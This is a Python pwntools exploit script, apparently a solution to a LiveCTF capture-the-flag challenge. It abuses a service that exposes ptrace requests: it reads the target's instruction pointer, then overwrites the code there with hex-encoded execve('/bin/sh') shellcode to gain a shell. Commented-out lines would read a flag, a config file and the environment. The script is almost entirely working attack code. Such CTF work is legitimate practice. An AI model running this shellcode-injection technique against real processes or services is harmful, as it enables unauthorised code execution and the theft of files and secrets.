#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

PTRACE_PEEKDATA = 2
PTRACE_PEEKUSER = 3
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17

def do_ptrace(req, addr, data):
    global io
#    print(io.recvline().decode())
    io.sendline(str(req).encode())

#    print(io.recvline().decode())
    io.sendline(str(addr).encode())

#    print(io.recvline().decode())
    io.sendline(str(data).encode())

def send_ptrace(io, req, addr, value, last = False):
    io.recvuntil('send?')
    io.sendline(f'{req:x}')
    io.recvuntil('want?')
    io.sendline(f'{addr:x}')
    io.recvuntil('data?')
    io.sendline(f'{value:x}')

    io.recvuntil('returned')

    res = int(io.recvline().strip(), 16)
    err = None

    data = io.recvuntil('1)?').decode()
    for line in data.split('\n'):
        if 'error' in line:
            err = line[13:].strip()

    if last:
        io.sendline('0')
    else:
        io.sendline('1')

    return res, err

if 1:
    io = remote(HOST, int(PORT))
else:
    io = process('../handout/challenge')

#    print('wait 10 sec')
#    time.sleep(10)

context.arch = 'amd64'
# sc = asm(shellcraft.amd64.sh())
sc = bytes.fromhex('6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05')
#print(len(sc))
#print(sc.hex())

rip, _ = send_ptrace(io, PTRACE_PEEKUSER, 0x80, 0)
#print('rip:', hex(rip))
#print('wait 20 sec')
#time.sleep(20)
for i in range(0, len(sc), 8):
    x = sc[i:i+8]
    while len(x) < 8:
        x += b'\0'

    x, = struct.unpack('<Q', x)
    # print(hex(x))

    send_ptrace(io, PTRACE_POKETEXT, rip + i, x)

import time
#print('wait 10 sec')
#time.sleep(10)
#rip, _ = send_ptrace(io, PTRACE_DETACH, 0x80, 0, last = 1)
rip, _ = send_ptrace(io, PTRACE_PEEKUSER, 0x80, 0, last = 1)
# io.interactive()

# io.sendline('cat /flag')
#io.sendline('cat /home/livectf/.config.toml')
#io.sendline('env')
#\io.sendline('grep --color=never -o \'LiveCTF{.*}\' /home/livectf/.config.toml')
io.sendline('./submitter')
# io.sendline('grep --color=never -o \'LiveCTF{.*}\' ../handout/config.toml')
io.interactive()
